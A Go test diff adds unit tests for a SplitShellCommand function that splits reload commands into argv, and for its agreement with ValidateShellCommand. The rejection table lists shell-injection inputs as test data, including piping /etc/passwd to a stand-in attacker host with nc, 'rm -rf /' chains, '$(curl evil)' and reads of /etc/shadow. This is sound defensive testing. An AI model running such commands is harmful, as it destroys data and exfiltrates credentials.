@@ -525,3 +525,112 @@ func TestSanitizeForShell(t *testing.T) {
 		})
 	}
 }
+
+// Phase 7 SEC-H2 contract pin (2026-05-14): SplitShellCommand
+// returns whitespace-separated argv for safe exec.Command use,
+// rejecting any input that ValidateShellCommand would reject.
+
+func TestSplitShellCommand_HappyPaths(t *testing.T) {
+	tests := []struct {
+		name string
+		cmd  string
+		want []string
+	}{
+		{"single binary", "nginx", []string{"nginx"}},
+		{"binary + flag", "nginx -s reload", []string{"nginx", "-s", "reload"}},
+		{"absolute path + args", "/usr/sbin/nginx -t -c /etc/nginx/nginx.conf", []string{"/usr/sbin/nginx", "-t", "-c", "/etc/nginx/nginx.conf"}},
+		{"systemctl reload", "systemctl reload nginx", []string{"systemctl", "reload", "nginx"}},
+		{"apache graceful", "apachectl graceful", []string{"apachectl", "graceful"}},
+		{"haproxy reload", "haproxy -W -f /etc/haproxy/haproxy.cfg -p /run/haproxy.pid -sf $(cat /run/haproxy.pid)", nil}, // contains $(...) — should error
+		{"haproxy no-pid", "haproxy -W -f /etc/haproxy/haproxy.cfg", []string{"haproxy", "-W", "-f", "/etc/haproxy/haproxy.cfg"}},
+		{"keytool import", "keytool -importcert -alias certctl -keystore /etc/pki/keystore.jks -storepass secret", []string{"keytool", "-importcert", "-alias", "certctl", "-keystore", "/etc/pki/keystore.jks", "-storepass", "secret"}},
+		{"extra whitespace", "  nginx   -s   reload  ", []string{"nginx", "-s", "reload"}},
+		{"tabs", "nginx\t-s\treload", []string{"nginx", "-s", "reload"}},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			argv, err := SplitShellCommand(tt.cmd)
+			if tt.want == nil {
+				// Expecting error
+				if err == nil {
+					t.Errorf("SplitShellCommand(%q) want error; got argv %v", tt.cmd, argv)
+				}
+				return
+			}
+			if err != nil {
+				t.Errorf("SplitShellCommand(%q) unexpected error: %v", tt.cmd, err)
+				return
+			}
+			if len(argv) != len(tt.want) {
+				t.Errorf("SplitShellCommand(%q) got %d args, want %d (got %v)", tt.cmd, len(argv), len(tt.want), argv)
+				return
+			}
+			for i := range argv {
+				if argv[i] != tt.want[i] {
+					t.Errorf("SplitShellCommand(%q) argv[%d] = %q, want %q", tt.cmd, i, argv[i], tt.want[i])
+				}
+			}
+		})
+	}
+}
+
+func TestSplitShellCommand_InjectionRejected(t *testing.T) {
+	// Anything that ValidateShellCommand rejects MUST be rejected by
+	// SplitShellCommand too. This pins the contract that the
+	// validation layer + split layer agree on the same threat model.
+	tests := []struct {
+		name string
+		cmd  string
+	}{
+		{"semicolon chain", "nginx -s reload; rm -rf /"},
+		{"pipe", "cat /etc/passwd | nc attacker.example 9999"},
+		{"command substitution dollar", "nginx -s reload $(curl evil)"},
+		{"command substitution backtick", "nginx -s reload `whoami`"},
+		{"background ampersand", "nginx -s reload & malware"},
+		{"redirect output", "nginx -s reload > /etc/passwd"},
+		{"redirect input", "sh < /etc/shadow"},
+		{"subshell parens", "(rm -rf /)"},
+		{"brace expansion", "rm {a,b,c}"},
+		{"backslash escape", "nginx \\; rm -rf /"},
+		{"double quote", `nginx -c "/etc/n;rm"`},
+		{"single quote", "nginx 'a;b'"},
+		{"newline", "nginx\nrm -rf /"},
+		{"carriage return", "nginx\rrm -rf /"},
+		{"null byte", "nginx\x00rm -rf /"},
+		{"empty input", ""},
+		{"whitespace-only input", "   "},
+	}
+
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			argv, err := SplitShellCommand(tt.cmd)
+			if err == nil {
+				t.Errorf("SplitShellCommand(%q) = %v with no error; want error (injection input)", tt.cmd, argv)
+			}
+		})
+	}
+}
+
+func TestSplitShellCommand_MatchesValidateShellCommand(t *testing.T) {
+	// Cross-check: every input ValidateShellCommand rejects,
+	// SplitShellCommand also rejects (with the same threat model).
+	rejectInputs := []string{
+		"nginx;",
+		"nginx | foo",
+		"nginx`x`",
+		"nginx$(x)",
+		`nginx"x"`,
+		"nginx'x'",
+		"nginx\\\\x",
+	}
+	for _, in := range rejectInputs {
+		t.Run(in, func(t *testing.T) {
+			vErr := ValidateShellCommand(in)
+			_, sErr := SplitShellCommand(in)
+			if (vErr == nil) != (sErr == nil) {
+				t.Errorf("agreement violation: ValidateShellCommand=%v, SplitShellCommand=%v for %q", vErr, sErr, in)
+			}
+		})
+	}
+}
